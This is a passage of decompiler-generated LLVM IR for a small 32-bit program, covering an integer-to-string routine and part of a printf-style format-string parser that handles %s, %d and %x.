  br i1 %v1_80484f2, label %dec_label_pc_80484cc, label %dec_label_pc_804850d.preheader

dec_label_pc_804850d.preheader:                   ; preds = %dec_label_pc_80484cc, %dec_label_pc_80484eb.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484eb.preheader ], [ %v4_80484e5, %dec_label_pc_80484cc ]
  %tmp64 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp65 = icmp eq i1 %tmp64, false
  br i1 %tmp65, label %dec_label_pc_80484f6.lr.ph, label %dec_label_pc_8048513

dec_label_pc_80484f6.lr.ph:                       ; preds = %dec_label_pc_804850d.preheader
  %v2_80484ff = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_80484f6

dec_label_pc_80484f6:                             ; preds = %dec_label_pc_80484f6.lr.ph, %dec_label_pc_80484f6
  %stack_var_-20.26 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484f6.lr.ph ], [ %v4_8048507, %dec_label_pc_80484f6 ]
  %stack_var_12.35 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_80484f6.lr.ph ], [ %v4_804850a, %dec_label_pc_80484f6 ]
  %v3_80484ff = call i32 @function_8048407(i32* %v2_80484ff, i32 %stack_var_-16.073)
  %v4_8048507 = add i32 %stack_var_-20.26, 1
  %v4_804850a = add i32 %stack_var_12.35, -1
  %tmp66 = icmp slt i32 %v4_804850a, 1
  %tmp67 = icmp eq i1 %tmp66, false
  br i1 %tmp67, label %dec_label_pc_80484f6, label %dec_label_pc_8048513

dec_label_pc_8048513:                             ; preds = %dec_label_pc_80484f6, %dec_label_pc_804850d.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804850d.preheader ], [ %v4_8048507, %dec_label_pc_80484f6 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_80484e8, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_804846d, { 1, 2, 0 }
  uselistorder i32 %v4_8048462, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i8* %arg2, { 2, 3, 1, 4, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80484f6, { 1, 0 }
  uselistorder label %dec_label_pc_80484cc, { 1, 0 }
  uselistorder label %dec_label_pc_80484eb.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80484ad, { 1, 0 }
  uselistorder label %dec_label_pc_804846a, { 1, 0 }
}

define i32 @function_8048518(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048518:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp30 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048532 = icmp eq i32 %tmp30, 0
  %v1_8048536 = icmp eq i1 %v4_8048532, false
  br i1 %v1_8048536, label %dec_label_pc_804855d, label %dec_label_pc_8048538

dec_label_pc_8048538:                             ; preds = %dec_label_pc_8048518
  store i32 48, i32* %stack_var_-16, align 4
  %tmp42 = bitcast i32* %stack_var_-16 to i8*
  %v6_804854d = call i32 @function_8048441(i32 %arg1, i8* %tmp42, i32 %tmp26, i32 %tmp27)
  br label %dec_label_pc_8048638

dec_label_pc_804855d:                             ; preds = %dec_label_pc_8048518
  %v5_8048532 = icmp slt i32 %tmp30, 0
  %v4_804855d = icmp eq i32 %tmp23, 0
  %v12_8048563 = icmp eq i32 %tmp22, 10
  %tmp50 = and i1 %v12_8048563, %v5_8048532
  %tmp51 = icmp ne i1 %tmp50, true
  %tmp52 = or i1 %v4_804855d, %tmp51
  br i1 %tmp52, label %dec_label_pc_804857e, label %dec_label_pc_804856f

dec_label_pc_804856f:                             ; preds = %dec_label_pc_804855d
  %v1_8048579 = sub i32 0, %tmp30
  br label %dec_label_pc_804857e

dec_label_pc_804857e:                             ; preds = %dec_label_pc_804855d, %dec_label_pc_804856f
  %stack_var_-24.0.in = phi i32 [ %tmp30, %dec_label_pc_804855d ], [ %v1_8048579, %dec_label_pc_804856f ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_804855d ], [ 1, %dec_label_pc_804856f ]
  %v15_8048581 = ptrtoint i32* %stack_var_-5 to i32
  %tmp43 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp43, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp43, align 4
  %v5_80485df8 = icmp eq i32 %stack_var_-24.0.in, 0
  %v1_80485e310 = icmp eq i1 %v5_80485df8, false
  br i1 %v1_80485e310, label %dec_label_pc_804858f.lr.ph, label %dec_label_pc_80485e5

dec_label_pc_804858f.lr.ph:                       ; preds = %dec_label_pc_804857e
  %v5_8048592 = sext i32 %tmp22 to i64
  %v5_80485ae = add i32 %tmp, 198
  br label %dec_label_pc_804858f

dec_label_pc_804858f:                             ; preds = %dec_label_pc_804858f.lr.ph, %dec_label_pc_804858f
  %v3_80485b713 = phi i8* [ %tmp43, %dec_label_pc_804858f.lr.ph ], [ %v22_80485b7, %dec_label_pc_804858f ]
  %stack_var_-24.111.in = phi i32 [ %stack_var_-24.0.in, %dec_label_pc_804858f.lr.ph ], [ %v13_804859d, %dec_label_pc_804858f ]
  %stack_var_-24.11148 = zext i32 %stack_var_-24.111.in to i64
  %v12_804859d = udiv i64 %stack_var_-24.11148, %v5_8048592
  %v13_804859d = trunc i64 %v12_804859d to i32
  %v14_804859d = urem i64 %stack_var_-24.11148, %v5_8048592
  %v5_80485a2 = trunc i64 %v14_804859d to i8
  %v7_80485a9 = icmp sgt i8 %v5_80485a2, 9
  %tmp53 = trunc i64 %v14_804859d to i32
  %v1_80485b1 = add i32 %v5_80485ae, %tmp53
  %v11_80485b1 = trunc i32 %v1_80485b1 to i8
  %stack_var_-36.0 = select i1 %v7_80485a9, i8 %v11_80485b1, i8 %v5_80485a2
  %v4_80485b7 = ptrtoint i8* %v3_80485b713 to i32
  %v5_80485b7 = add i32 %v4_80485b7, -1
  %v22_80485b7 = inttoptr i32 %v5_80485b7 to i8*
  %v1_80485bd = add i8 %stack_var_-36.0, 48
  store i8 %v1_80485bd, i8* %v22_80485b7, align 1
  %v5_80485df = icmp eq i32 %v13_804859d, 0
  %v1_80485e3 = icmp eq i1 %v5_80485df, false
  br i1 %v1_80485e3, label %dec_label_pc_804858f, label %dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge

dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge: ; preds = %dec_label_pc_804858f
  store i8* %v22_80485b7, i8** %stack_var_-40, align 4
  br label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge, %dec_label_pc_804857e
  %v3_8048622617 = phi i32 [ %v5_80485b7, %dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge ], [ %v15_8048581, %dec_label_pc_804857e ]
  %v3_8048613 = phi i8* [ %v22_80485b7, %dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge ], [ %tmp43, %dec_label_pc_804857e ]
  %v4_80485e5 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_80485e5, label %dec_label_pc_804861c, label %dec_label_pc_80485eb

dec_label_pc_80485eb:                             ; preds = %dec_label_pc_80485e5
  %v4_80485eb = icmp eq i32 %tmp26, 0
  br i1 %v4_80485eb, label %dec_label_pc_8048613, label %dec_label_pc_80485f1

dec_label_pc_80485f1:                             ; preds = %dec_label_pc_80485eb
  %v1_80485f4 = and i32 %tmp27, 2
  %v2_80485f4 = icmp eq i32 %v1_80485f4, 0
  br i1 %v2_80485f4, label %dec_label_pc_8048613, label %dec_label_pc_80485fb

dec_label_pc_80485fb:                             ; preds = %dec_label_pc_80485f1
  %v3_8048603 = inttoptr i32 %arg1 to i32*
  %v4_8048603 = call i32 @function_8048407(i32* %v3_8048603, i32 45)
  %v4_804860e = add i32 %tmp26, -1
  br label %dec_label_pc_804861c

dec_label_pc_8048613:                             ; preds = %dec_label_pc_80485f1, %dec_label_pc_80485eb
  %v4_8048613 = ptrtoint i8* %v3_8048613 to i32
  %v5_8048613 = add i32 %v4_8048613, -1
  %v22_8048613 = inttoptr i32 %v5_8048613 to i8*
  store i8* %v22_8048613, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048613, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80486226.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804861c

dec_label_pc_804861c:                             ; preds = %dec_label_pc_80485e5, %dec_label_pc_80485fb, %dec_label_pc_8048613
  %v3_80486226 = phi i32 [ %v3_8048622617, %dec_label_pc_80485e5 ], [ %v3_80486226.pre, %dec_label_pc_8048613 ], [ %v3_8048622617, %dec_label_pc_80485fb ]
  %stack_var_20.0 = phi i32 [ %tmp26, %dec_label_pc_80485e5 ], [ %tmp26, %dec_label_pc_8048613 ], [ %v4_804860e, %dec_label_pc_80485fb ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 0, %dec_label_pc_8048613 ], [ 1, %dec_label_pc_80485fb ]
  %v1_8048628.cast = inttoptr i32 %v3_80486226 to i8*
  %v6_8048628 = call i32 @function_8048441(i32 %arg1, i8* %v1_8048628.cast, i32 %stack_var_20.0, i32 %tmp27)
  %v2_8048633 = add i32 %v6_8048628, %stack_var_-28.0
  store i32 %v2_8048633, i32* @edx, align 4
  br label %dec_label_pc_8048638

dec_label_pc_8048638:                             ; preds = %dec_label_pc_8048538, %dec_label_pc_804861c
  %storemerge = phi i32 [ %v2_8048633, %dec_label_pc_804861c ], [ %v6_804854d, %dec_label_pc_8048538 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_80485b7, { 0, 1, 3, 2 }
  uselistorder i32 %v13_804859d, { 1, 0 }
  uselistorder i32 %tmp30, { 0, 3, 1, 2 }
  uselistorder i32 %tmp27, { 0, 2, 1 }
  uselistorder i32 %tmp26, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp22, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048638, { 1, 0 }
  uselistorder label %dec_label_pc_804861c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804858f, { 1, 0 }
  uselistorder label %dec_label_pc_804857e, { 1, 0 }
}

define i32 @function_804863d(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804863d:
  %eax.global-to-local = alloca i32, align 4
  %tmp21 = ptrtoint i32* %arg1 to i32
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_8.42 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80488683 = load i8, i8* %stack_var_8.42, align 1
  %v3_80488684 = zext i8 %v2_80488683 to i32
  %v5_80488685 = and i32 %arg2, -256
  %v6_80488686 = or i32 %v3_80488684, %v5_80488685
  store i32 %v6_80488686, i32* %eax.global-to-local, align 4
  %v4_804886a7 = icmp eq i8 %v2_80488683, 0
  %v1_804886c9 = icmp eq i1 %v4_804886a7, false
  br i1 %v1_804886c9, label %dec_label_pc_804864f.lr.ph, label %dec_label_pc_8048872

dec_label_pc_804864f.lr.ph:                       ; preds = %dec_label_pc_804863d
  %v15_8048640 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048832 = ptrtoint i32* %stack_var_-6 to i32
  br label %dec_label_pc_804864f

dec_label_pc_804864f:                             ; preds = %dec_label_pc_804864f.lr.ph, %dec_label_pc_8048862
  %v0_8048850 = phi i32 [ %v15_8048640, %dec_label_pc_804864f.lr.ph ], [ %v4_804871419, %dec_label_pc_8048862 ]
  %v5_804886815 = phi i32 [ %v5_80488685, %dec_label_pc_804864f.lr.ph ], [ %v5_8048868, %dec_label_pc_8048862 ]
  %stack_var_8.414 = phi i8* [ %stack_var_8.42, %dec_label_pc_804864f.lr.ph ], [ %stack_var_8.4, %dec_label_pc_8048862 ]
  %stack_var_-28.113 = phi i32 [ 0, %dec_label_pc_804864f.lr.ph ], [ %stack_var_-28.0, %dec_label_pc_8048862 ]
  %stack_var_8.4.in12 = phi i32 [ %arg2, %dec_label_pc_804864f.lr.ph ], [ %v5_8048862, %dec_label_pc_8048862 ]
  %stack_var_12.111 = phi i32 [ %arg3, %dec_label_pc_804864f.lr.ph ], [ %stack_var_12.0, %dec_label_pc_8048862 ]
  %stack_var_-24.110 = phi i32 [ %tmp23, %dec_label_pc_804864f.lr.ph ], [ %stack_var_-24.0, %dec_label_pc_8048862 ]
  store i32 %stack_var_8.4.in12, i32* %eax.global-to-local, align 4
  %v2_8048652 = load i8, i8* %stack_var_8.414, align 1
  %v3_8048652 = zext i8 %v2_8048652 to i32
  %v6_8048652 = or i32 %v3_8048652, %v5_804886815
  store i32 %v6_8048652, i32* %eax.global-to-local, align 4
  %v10_8048654 = icmp eq i8 %v2_8048652, 37
  %v1_8048656 = icmp eq i1 %v10_8048654, false
  br i1 %v1_8048656, label %dec_label_pc_8048846, label %dec_label_pc_804865c

dec_label_pc_804865c:                             ; preds = %dec_label_pc_804864f
  %v5_804865c = add i32 %stack_var_8.4.in12, 1
  %v22_804865c = inttoptr i32 %v5_804865c to i8*
  store i32 %v5_804865c, i32* %eax.global-to-local, align 4
  %v2_804866f = load i8, i8* %v22_804865c, align 1
  %v3_804866f = zext i8 %v2_804866f to i32
  %v5_804866f = and i32 %v5_804865c, -256
  %v6_804866f = or i32 %v3_804866f, %v5_804866f
  store i32 %v6_804866f, i32* %eax.global-to-local, align 4
  %v4_8048671 = icmp eq i8 %v2_804866f, 0
  br i1 %v4_8048671, label %dec_label_pc_8048872, label %dec_label_pc_8048679

dec_label_pc_8048679:                             ; preds = %dec_label_pc_804865c
  store i32 %v5_804865c, i32* %eax.global-to-local, align 4
  %v2_804867c = load i8, i8* %v22_804865c, align 1
  %v3_804867c = zext i8 %v2_804867c to i32
  %v6_804867c = or i32 %v3_804867c, %v5_804866f
  store i32 %v6_804867c, i32* %eax.global-to-local, align 4
  %v10_804867e = icmp eq i8 %v2_804867c, 37
  br i1 %v10_804867e, label %dec_label_pc_8048846, label %dec_label_pc_8048686

dec_label_pc_8048686:                             ; preds = %dec_label_pc_8048679
  store i32 %v5_804865c, i32* %eax.global-to-local, align 4
  %v2_8048689 = load i8, i8* %v22_804865c, align 1
  %v3_8048689 = zext i8 %v2_8048689 to i32
  %v6_8048689 = or i32 %v3_8048689, %v5_804866f
  store i32 %v6_8048689, i32* %eax.global-to-local, align 4
  %v10_804868b = icmp eq i8 %v2_8048689, 45
  %v1_804868d = icmp eq i1 %v10_804868b, false
  %v5_804868f = add i32 %stack_var_8.4.in12, 2
  %v22_804868f = inttoptr i32 %v5_804868f to i8*
  %tmp64 = zext i1 %v1_804868d to i32
  %stack_var_-32.0.ph = xor i32 %tmp64, 1
  %stack_var_8.0.ph = select i1 %v1_804868d, i8* %v22_804865c, i8* %v22_804868f
  %v4_80486a233 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_80486a233, i32* %eax.global-to-local, align 4
  %v2_80486a534 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_80486a535 = zext i8 %v2_80486a534 to i32
  %v5_80486a536 = and i32 %v4_80486a233, -256
  %v6_80486a537 = or i32 %v3_80486a535, %v5_80486a536
  store i32 %v6_80486a537, i32* %eax.global-to-local, align 4
  %v7_80486a738 = icmp eq i8 %v2_80486a534, 48
  br i1 %v7_80486a738, label %dec_label_pc_804869b, label %dec_label_pc_80486d1.preheader

dec_label_pc_804869b:                             ; preds = %dec_label_pc_8048686, %dec_label_pc_804869b
  %v4_80486a240 = phi i32 [ %v5_804869b, %dec_label_pc_804869b ], [ %v4_80486a233, %dec_label_pc_8048686 ]
  %stack_var_-32.039 = phi i32 [ %v4_804869e, %dec_label_pc_804869b ], [ %stack_var_-32.0.ph, %dec_label_pc_8048686 ]
  %v5_804869b = add i32 %v4_80486a240, 1
  %v22_804869b = inttoptr i32 %v5_804869b to i8*
  %v4_804869e = or i32 %stack_var_-32.039, 2
  store i32 %v5_804869b, i32* %eax.global-to-local, align 4
  %v2_80486a5 = load i8, i8* %v22_804869b, align 1
  %v3_80486a5 = zext i8 %v2_80486a5 to i32
  %v5_80486a5 = and i32 %v5_804869b, -256
  %v6_80486a5 = or i32 %v3_80486a5, %v5_80486a5
  store i32 %v6_80486a5, i32* %eax.global-to-local, align 4
  %v7_80486a7 = icmp eq i8 %v2_80486a5, 48
  br i1 %v7_80486a7, label %dec_label_pc_804869b, label %dec_label_pc_80486d1.preheader

dec_label_pc_80486d1.preheader:                   ; preds = %dec_label_pc_804869b, %dec_label_pc_8048686
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048686 ], [ %v4_804869e, %dec_label_pc_804869b ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048686 ], [ %v22_804869b, %dec_label_pc_804869b ]
  %v4_80486d142 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_80486d142, i32* %eax.global-to-local, align 4
  %v2_80486d443 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_80486d444 = zext i8 %v2_80486d443 to i32
  %v5_80486d445 = and i32 %v4_80486d142, -256
  %v6_80486d446 = or i32 %v3_80486d444, %v5_80486d445
  store i32 %v6_80486d446, i32* %eax.global-to-local, align 4
  %tmp65 = icmp ult i8 %v2_80486d443, 48
  br i1 %tmp65, label %dec_label_pc_80486e3, label %dec_label_pc_80486da

dec_label_pc_80486ad:                             ; preds = %dec_label_pc_80486da
  %v2_80486b6 = mul i32 %stack_var_-36.047, 10
  store i32 %v4_80486d149, i32* %eax.global-to-local, align 4
  %v2_80486be = load i8, i8* %stack_var_8.148, align 1
  %v3_80486be = zext i8 %v2_80486be to i32
  %v5_80486c5 = add i32 %v2_80486b6, -48
  %v1_80486c8 = add i32 %v5_80486c5, %v3_80486be
  %v5_80486ce = add i32 %v4_80486d149, 1
  %v22_80486ce = inttoptr i32 %v5_80486ce to i8*
  store i32 %v5_80486ce, i32* %eax.global-to-local, align 4
  %v2_80486d4 = load i8, i8* %v22_80486ce, align 1
  %v3_80486d4 = zext i8 %v2_80486d4 to i32
  %v5_80486d4 = and i32 %v5_80486ce, -256
  %v6_80486d4 = or i32 %v3_80486d4, %v5_80486d4
  store i32 %v6_80486d4, i32* %eax.global-to-local, align 4
  %tmp66 = icmp ult i8 %v2_80486d4, 48
  br i1 %tmp66, label %dec_label_pc_80486e3, label %dec_label_pc_80486da

dec_label_pc_80486da:                             ; preds = %dec_label_pc_80486d1.preheader, %dec_label_pc_80486ad
  %v5_80486d450 = phi i32 [ %v5_80486d4, %dec_label_pc_80486ad ], [ %v5_80486d445, %dec_label_pc_80486d1.preheader ]
  %v4_80486d149 = phi i32 [ %v5_80486ce, %dec_label_pc_80486ad ], [ %v4_80486d142, %dec_label_pc_80486d1.preheader ]
  %stack_var_8.148 = phi i8* [ %v22_80486ce, %dec_label_pc_80486ad ], [ %stack_var_8.0.lcssa, %dec_label_pc_80486d1.preheader ]
  %stack_var_-36.047 = phi i32 [ %v1_80486c8, %dec_label_pc_80486ad ], [ 0, %dec_label_pc_80486d1.preheader ]
  store i32 %v4_80486d149, i32* %eax.global-to-local, align 4
  %v2_80486dd = load i8, i8* %stack_var_8.148, align 1
  %v3_80486dd = zext i8 %v2_80486dd to i32
  %v6_80486dd = or i32 %v3_80486dd, %v5_80486d450
  store i32 %v6_80486dd, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_80486dd, 58
  br i1 %tmp67, label %dec_label_pc_80486ad, label %dec_label_pc_80486e3

dec_label_pc_80486e3:                             ; preds = %dec_label_pc_80486ad, %dec_label_pc_80486da, %dec_label_pc_80486d1.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_80486d1.preheader ], [ %stack_var_-36.047, %dec_label_pc_80486da ], [ %v1_80486c8, %dec_label_pc_80486ad ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_80486d1.preheader ], [ %stack_var_8.148, %dec_label_pc_80486da ], [ %v22_80486ce, %dec_label_pc_80486ad ]
  %v4_80486d1.lcssa = phi i32 [ %v4_80486d142, %dec_label_pc_80486d1.preheader ], [ %v4_80486d149, %dec_label_pc_80486da ], [ %v5_80486ce, %dec_label_pc_80486ad ]
  %v5_80486d4.lcssa = phi i32 [ %v5_80486d445, %dec_label_pc_80486d1.preheader ], [ %v5_80486d450, %dec_label_pc_80486da ], [ %v5_80486d4, %dec_label_pc_80486ad ]
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486e6 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486e6 = zext i8 %v2_80486e6 to i32
  %v6_80486e6 = or i32 %v3_80486e6, %v5_80486d4.lcssa
  store i32 %v6_80486e6, i32* %eax.global-to-local, align 4
  %v10_80486e8 = icmp eq i8 %v2_80486e6, 115
  %v1_80486ea = icmp eq i1 %v10_80486e8, false
  br i1 %v1_80486ea, label %dec_label_pc_804872e, label %dec_label_pc_80486ec

dec_label_pc_80486ec:                             ; preds = %dec_label_pc_80486e3
  store i32 %stack_var_12.111, i32* @edx, align 4
  %v1_80486ef = add i32 %stack_var_12.111, 4
  store i32 %stack_var_12.111, i32* %eax.global-to-local, align 4
  %v1_80486f7 = inttoptr i32 %stack_var_12.111 to i32*
  %v2_80486f7 = load i32, i32* %v1_80486f7, align 4
  store i32 %v2_80486f7, i32* %eax.global-to-local, align 4
  %v4_80486fc = icmp eq i32 %v2_80486f7, 0
  br i1 %v4_80486fc, label %dec_label_pc_8048711, label %dec_label_pc_8048702

dec_label_pc_8048702:                             ; preds = %dec_label_pc_80486ec
  store i32 %v2_80486f7, i32* %eax.global-to-local, align 4
  %v5_8048705 = inttoptr i32 %v2_80486f7 to i8*
  br label %dec_label_pc_8048711

dec_label_pc_8048711:                             ; preds = %dec_label_pc_80486ec, %dec_label_pc_8048702
  %storemerge = phi i8* [ %v5_8048705, %dec_label_pc_8048702 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8052542.16, i32 0, i32 0), %dec_label_pc_80486ec ]
  %v4_8048711 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048711, i32* %eax.global-to-local, align 4
  %v5_8048714 = add i32 %v0_8048850, -4
  %v6_8048714 = inttoptr i32 %v5_8048714 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048714, align 4
  %v5_8048717 = add i32 %v0_8048850, -8
  %v6_8048717 = inttoptr i32 %v5_8048717 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048717, align 4
  %v0_804871a = load i32, i32* %eax.global-to-local, align 4
  %v2_804871a = add i32 %v0_8048850, -12
  %v3_804871a = inttoptr i32 %v2_804871a to i32*
  store i32 %v0_804871a, i32* %v3_804871a, align 4
  %v5_804871b = add i32 %v0_8048850, -16
  %v6_804871b = inttoptr i32 %v5_804871b to i32*
  store i32 %tmp21, i32* %v6_804871b, align 4
  %v5_804871e = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804871e = call i32 @function_8048441(i32 %v4_8048711, i8* %v5_804871e, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.113)
  store i32 %v6_804871e, i32* %eax.global-to-local, align 4
  %v0_8048723 = load i32, i32* @esp, align 4
  %v1_8048723 = add i32 %v0_8048723, 16
  %v5_8048726 = add i32 %v6_804871e, %stack_var_-28.113
  br label %dec_label_pc_8048862

dec_label_pc_804872e:                             ; preds = %dec_label_pc_80486e3
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048731 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048731 = zext i8 %v2_8048731 to i32
  %v6_8048731 = or i32 %v3_8048731, %v5_80486d4.lcssa
  store i32 %v6_8048731, i32* %eax.global-to-local, align 4
  %v10_8048733 = icmp eq i8 %v2_8048731, 100
  %v1_8048735 = icmp eq i1 %v10_8048733, false
  br i1 %v1_8048735, label %dec_label_pc_8048767, label %dec_label_pc_8048737

dec_label_pc_8048737:                             ; preds = %dec_label_pc_804872e
  store i32 %stack_var_12.111, i32* @edx, align 4
  %v1_804873a = add i32 %stack_var_12.111, 4
  store i32 %stack_var_12.111, i32* %eax.global-to-local, align 4
  %v1_8048742 = inttoptr i32 %stack_var_12.111 to i32*
  %v2_8048742 = load i32, i32* %v1_8048742, align 4
  store i32 %v2_8048742, i32* %eax.global-to-local, align 4
  %v1_8048747 = add i32 %v0_8048850, -8
  %v2_8048747 = inttoptr i32 %v1_8048747 to i32*
  store i32 97, i32* %v2_8048747, align 4
  %v5_8048749 = add i32 %v0_8048850, -12
  %v6_8048749 = inttoptr i32 %v5_8048749 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048749, align 4
  %v5_804874c = add i32 %v0_8048850, -16
  %v6_804874c = inttoptr i32 %v5_804874c to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804874c, align 4
  %v1_804874f = add i32 %v0_8048850, -20
  %v2_804874f = inttoptr i32 %v1_804874f to i32*
  store i32 1, i32* %v2_804874f, align 4
  %v1_8048751 = add i32 %v0_8048850, -24
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 10, i32* %v2_8048751, align 4
  %v0_8048753 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048753 = add i32 %v0_8048850, -28
  %v3_8048753 = inttoptr i32 %v2_8048753 to i32*
  store i32 %v0_8048753, i32* %v3_8048753, align 4
  %v5_8048754 = add i32 %v0_8048850, -32
  %v6_8048754 = inttoptr i32 %v5_8048754 to i32*
  store i32 %tmp21, i32* %v6_8048754, align 4
  %v1_8048757 = call i32 @function_8048518(i32 %v1_804873a)
  store i32 %v1_8048757, i32* %eax.global-to-local, align 4
  %v0_804875c = load i32, i32* @esp, align 4
  %v1_804875c = add i32 %v0_804875c, 32
  %v5_804875f = add i32 %v1_8048757, %stack_var_-28.113
  br label %dec_label_pc_8048862

dec_label_pc_8048767:                             ; preds = %dec_label_pc_804872e
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_804876a = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804876a = zext i8 %v2_804876a to i32
  %v6_804876a = or i32 %v3_804876a, %v5_80486d4.lcssa
  store i32 %v6_804876a, i32* %eax.global-to-local, align 4
  %v10_804876c = icmp eq i8 %v2_804876a, 120
  %v1_804876e = icmp eq i1 %v10_804876c, false
  br i1 %v1_804876e, label %dec_label_pc_80487a0, label %dec_label_pc_8048770

dec_label_pc_8048770:                             ; preds = %dec_label_pc_8048767
  store i32 %stack_var_12.111, i32* @edx, align 4
  %v1_8048773 = add i32 %stack_var_12.111, 4
  store i32 %stack_var_12.111, i32* %eax.global-to-local, align 4
  %v1_804877b = inttoptr i32 %stack_var_12.111 to i32*
  %v2_804877b = load i32, i32* %v1_804877b, align 4
  store i32 %v2_804877b, i32* %eax.global-to-local, align 4
  %v1_8048780 = add i32 %v0_8048850, -8
  %v2_8048780 = inttoptr i32 %v1_8048780 to i32*
  store i32 97, i32* %v2_8048780, align 4
  %v5_8048782 = add i32 %v0_8048850, -12
  %v6_8048782 = inttoptr i32 %v5_8048782 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048782, align 4
  %v5_8048785 = add i32 %v0_8048850, -16
  %v6_8048785 = inttoptr i32 %v5_8048785 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048785, align 4
  %v1_8048788 = add i32 %v0_8048850, -20
  %v2_8048788 = inttoptr i32 %v1_8048788 to i32*
  store i32 0, i32* %v2_8048788, align 4
  %v1_804878a = add i32 %v0_8048850, -24
  %v2_804878a = inttoptr i32 %v1_804878a to i32*
  store i32 16, i32* %v2_804878a, align 4
  %v0_804878c = load i32, i32* %eax.global-to-local, align 4
  %v2_804878c = add i32 %v0_8048850, -28
  %v3_804878c = inttoptr i32 %v2_804878c to i32*
  store i32 %v0_804878c, i32* %v3_804878c, align 4
  %v5_804878d = add i32 %v0_8048850, -32
  %v6_804878d = inttoptr i32 %v5_804878d to i32*
  store i32 %tmp21, i32* %v6_804878d, align 4
  %v1_8048790 = call i32 @function_8048518(i32 %v1_8048773)
  store i32 %v1_8048790, i32* %eax.global-to-local, align 4
  %v0_8048795 = load i32, i32* @esp, align 4
  %v1_8048795 = add i32 %v0_8048795, 32
  %v5_8048798 = add i32 %v1_8048790, %stack_var_-28.113
  br label %dec_label_pc_8048862

dec_label_pc_80487a0:                             ; preds = %dec_label_pc_8048767
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487a3 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80487a3 = zext i8 %v2_80487a3 to i32
  %v6_80487a3 = or i32 %v3_80487a3, %v5_80486d4.lcssa
